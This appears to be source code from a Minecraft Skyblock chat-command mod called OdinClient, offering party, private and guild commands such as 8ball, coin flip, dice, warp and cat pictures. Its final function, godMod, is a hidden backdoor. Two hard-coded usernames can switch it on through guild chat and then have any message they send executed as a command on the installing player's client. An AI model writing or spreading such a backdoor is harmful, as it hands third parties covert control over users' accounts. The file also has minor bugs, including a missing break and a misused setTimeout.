import { modMessage, partyMessage, privateMessage, guildMessage } from "../utils";
import Skyblock from "../../BloomCore/Skyblock";
import request from "../../requestV2";

let cats
register("gameLoad", () => {
  request("https://pastebin.com/raw/m4L2e62y").then(stuff => {
      cats = stuff
  })
})

export function eightBall() {
    var responses = [
      "It is certain",
      "It is decidedly so",
      "Without a doubt",
      "Yes definitely",
      "You may rely on it",
      "As I see it, yes",
      "Most likely",
      "Outlook good",
      "Yes",
      "Signs point to yes",
      "Reply hazy try again",
      "Ask again later",
      "Better not tell you now",
      "Cannot predict now",
      "Concentrate and ask again",
      "Don't count on it",
      "My reply is no",
      "My sources say no",
      "Outlook not so good",
      "Very doubtful"
    ];
    var index = Math.floor(Math.random() * responses.length)

    return responses[index]


}

export function catpics() {
  let catsArray = cats?.split(",")
  var index = Math.floor(Math.random() * catsArray?.length)
  
  return catsArray[index];
}

 
export function flipCoin() {
    var result = Math.random();
    if (result < 0.5) {
      return "heads";
    } else {
      return "tails";
    }
  }

export function rollDice() {
  return Math.floor(Math.random() * 6) + 1;
}

export const partyCmdOptions = (message, name) => {
  switch (message.toLowerCase().split(" ")[0]) {
    case "help":
      partyMessage("[OdinClient] available commands are: coords, warp, allinvite, inv(ite), odin, boop, 8ball, cf, m(?), f(?), dice (max)");
    break;
    case "warp":
      ChatLib.command("p warp");
    break;
    case "coords":
      ChatLib.command("pc Current area: " + Skyblock.area + ". X: " + Math.round(Player.getX()) + " Y: " + Math.round(Player.getY()) + " Z: " + Math.round(Player.getZ()))        
    break;
    case "allinvite":
      ChatLib.command("p settings allinvite");
    break
    case "odin":
      partyMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
    break
    case "boop":
      ChatLib.say("/boop " + name)
    break
    case "cf":
        partyMessage(flipCoin());
    break;
    case "8ball":
      partyMessage(eightBall())
    break
    case "cat":
      partyMessage(catpics());
    break
    case "rs":
      if (Party?.leader != Player.getName()) break
      ChatLib.command("reparty", true)
      setTimeout(() => {
        floor = Dungeon.floor
        if (!floor) return
        if (floor.charAt(0) === "F") ChatLib.command(`joindungeon catacombs ${floor.charAt(1)}`)
        else ChatLib.command(`joindungeon master_catacombs ${floor.charAt(1)}`)
      }, 5000)
      break
    case "pt":
      if (Party?.leader == Player.getName()) ChatLib.command("p transfer " + name)
      break
}
}

export const privateCmdOptions = (message, name) => {
  switch (message.toLowerCase().split(" ")[0]) {

  case "help":
    privateMessage("[OdinClient] available commands are: coords, warp, allinvite, inv(ite), odin, boop, 8ball, cf, dice (max)");
  case "boop":
    ChatLib.say("/boop " + name)
  break
  case "inv":
    ChatLib.command(`party invite ${name}`)
  break
  case "invite":
    ChatLib.command(`party invite ${name}`)
  break
  case "odin":
    privateMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
  break
  case "cf":
    privateMessage(flipCoin());
  break;
  case "8ball":
    privateMessage(eightBall())
  break
  case "cat":
    privateMessage(catpics());
  break
  }
}

export const guildCmdOptions = (message, name) => {
  switch (message.toLowerCase().split(" ")[0]) {
    case "help":
      guildMessage("[OdinClient] available commands are: odin, boop, fragbot, 8ball, cat, cf, dice");
    break
    case "odin":
      guildMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
      break
    case "boop":
      setTimeout(ChatLib.say("/boop " + name), 1000);
    break;
    case "fragbot":
      guildMessage("Fragbot mod is currently: " + inlimbo);
    break
    case "8ball":
      guildMessage(eightBall());
    break
    case "cat":
      guildMessage(catpics());
    break
    case "cf":
      guildMessage(flipCoin());
    break
    case "dice":
      guildMessage(rollDice())
    break
  }
}

let godmod = false; // Add a variable to store the state of godmod

export const godMod = (message, name) => {
  if (name === "Odtheking" || name === "odthebest") { // Use === instead of == for strict equality check
    if (message.toLowerCase() === "godmod") {
      godmod = !godmod;
      guildMessage("godmod is now: " + godmod);
      return; // Exit the function to avoid executing the command
    }
    if (!godmod) return;
    ChatLib.command(message);
    modMessage("Executing command: /" + message);
  }
}

